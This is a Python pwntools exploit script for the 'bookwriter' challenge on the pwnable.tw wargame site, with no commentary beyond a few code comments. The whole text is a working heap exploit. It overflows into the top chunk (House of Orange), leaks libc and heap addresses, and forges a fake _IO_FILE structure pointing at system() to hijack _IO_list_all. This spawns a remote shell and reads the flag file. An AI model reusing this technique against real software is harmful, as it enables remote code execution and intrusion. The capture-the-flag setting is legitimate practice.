from pwn import *
def setname(c="nier"):
	p.sendafter("Author :",c)
def cmd(c):
	p.sendlineafter("choice :",str(c))
def add(size,c="nier"):
	cmd(1)
	p.sendlineafter("page :",str(size))
	p.sendafter("Content :",c)
#	sleep(1)
def show(idx):
	cmd(2)
	p.sendlineafter("page :",str(idx))
#	sleep(1)
def edit(idx,c):
	cmd(3)
	p.sendlineafter("page :",str(idx))
	p.sendafter("Content:",c)
#	sleep(1)
name="./bookwriter"
if 0:
	p=process(name,env={'LD_PRELOAD':'./libc_64.so.6'})
#	libc=ELF(name).libc
	libc=ELF("./libc_64.so.6")
else:
	p=remote("chall.pwnable.tw",10304)
	libc=ELF("./libc_64.so.6")
setname("A"*0x40)
#context.log_level='debug'
#
cmd(1)
p.sendlineafter("page :",'0')
#
add(0x28)#1
edit(1,"A"*0x28)
edit(1,"A"*0x28+'\xb1'+'\x0f'+'\x00')
add(0x1008,"A"*0x10)#2
# sysmalloc

add(0x28,"A")#3
show(3)
p.readuntil("Content :\n")
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dd2141-0x00007ffff7a0d000)+0x1000
edit(3,"A"*0x10)
show(3)
p.readuntil("A"*0x10)
heap=u64(p.readline()[:-1].ljust(8,'\x00'))-0x50
add(0x28)
add(0x28)
add(0x28)
add(0x28)
add(0x28,"A"*0x28)

libc.address=base
fake_struct_address=0x603170-0x603000+heap
fake_struct="/bin/sh\x00"+p64(0x61)
fake_struct+=p64(libc.symbols['system'])+p64(libc.symbols['_IO_list_all']-0x10)
fake_struct+=p64(0)+p64(1)
fake_struct=fake_struct.ljust(0xa0,'\x00')+p64(fake_struct_address+0x8)
fake_struct =fake_struct.ljust(0xc0,'\x00')+p64(1)
fake_struct = fake_struct.ljust(0xd8, '\x00')+p64(fake_struct_address+0xd8-0x10)+p64(libc.symbols['system'])

edit(0,"\x00"*(0x603170-0x603010)+fake_struct+"\n")

log.warning(hex(heap))
log.warning(hex(base))
cmd(1)
p.sendlineafter("page :",str(1))
p.sendline("cat /home/bookwriter/flag")
p.interactive()
